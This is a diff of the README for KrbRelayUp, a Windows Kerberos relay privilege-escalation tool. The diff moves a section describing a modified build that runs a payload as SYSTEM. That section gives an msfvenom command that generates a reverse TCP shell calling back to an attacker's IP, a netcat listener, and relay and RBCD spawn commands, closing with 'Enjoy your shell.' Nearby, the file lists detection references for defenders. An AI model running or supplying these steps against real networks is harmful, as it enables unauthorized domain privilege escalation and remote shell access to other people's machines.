@@ -1,22 +1,3 @@
-# Modified version of KrbRelayUp to execute custom executables
-**KrbRelayUp-Shell.exe**: This version of KrbRelayUp.exe runs C:\Temp\update.exe instead of opening a new commad prompt. Useful if you don't have RDP access to a machine and need to get a reverse shell as SYSTEM. 
-
-# Example Usage with msfvenom payloads
-
-`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=443 EXITFUNC=thread -f exe > update.exe`
-
-Make sure to place your binary `update.exe` under `C:\Temp`, otherwise it won't be executed. Start a reverse shell:
-
-`sudo rlwrap nc -nvlp 443`
-
-And run KrbRelayUp exploit on the windows machine:
-
-`.\KrbRelayUp.exe relay -c -cn machAccount$ -cp pass@123`
-
-`.\KrbRelayUp.exe spawn -m rbcd -d <bla.local> -dc <DC.bla.local> -cn machAccount$ -cp pass@123`
-
-Enjoy your shell.
-
 # KrbRelayUp
 Simple wrapper around some of the features of [Rubeus](https://github.com/GhostPack/Rubeus/) and [KrbRelay](https://github.com/cube0x0/KrbRelay) (and a few other honorable mentions in the acknowledgements section) in order to streamline the abuse of the following attack primitive:
 
@@ -139,6 +120,25 @@ General Options:
     2. https://twitter.com/SBousseaden/status/1518976397364056071 ([@SBousseaden](https://twitter.com/SBousseaden)). Mainly the rule about authentication to Service Manager via Kerberos from 127.0.0.1, Great Work!.
     3. https://www.linkedin.com/posts/john-dwyer-xforce_threathunting-threatdetection-blueteam-activity-6924739962131140608-py45/ ([John Dwyer](https://www.linkedin.com/in/john-dwyer-xforce/) [@TactiKoolSec](https://twitter.com/TactiKoolSec))
     4. https://twitter.com/cyb3rops/status/1519241598311321601 ([@cyb3rops](https://twitter.com/cyb3rops))
+
+# Modified version of KrbRelayUp to execute custom executables
+**KrbRelayUp-Shell.exe**: This version of KrbRelayUp.exe runs C:\Temp\update.exe instead of opening a new commad prompt. Useful if you don't have RDP access to a machine and need to get a reverse shell as SYSTEM. 
+
+# Example Usage with msfvenom payloads
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=443 EXITFUNC=thread -f exe > update.exe`
+
+Make sure to place your binary `update.exe` under `C:\Temp`, otherwise it won't be executed. Start a reverse shell:
+
+`sudo rlwrap nc -nvlp 443`
+
+And run KrbRelayUp exploit on the windows machine:
+
+`.\KrbRelayUp.exe relay -c -cn machAccount$ -cp pass@123`
+
+`.\KrbRelayUp.exe spawn -m rbcd -d <bla.local> -dc <DC.bla.local> -cn machAccount$ -cp pass@123`
+
+Enjoy your shell.
 
 
 ## Acknowledgements
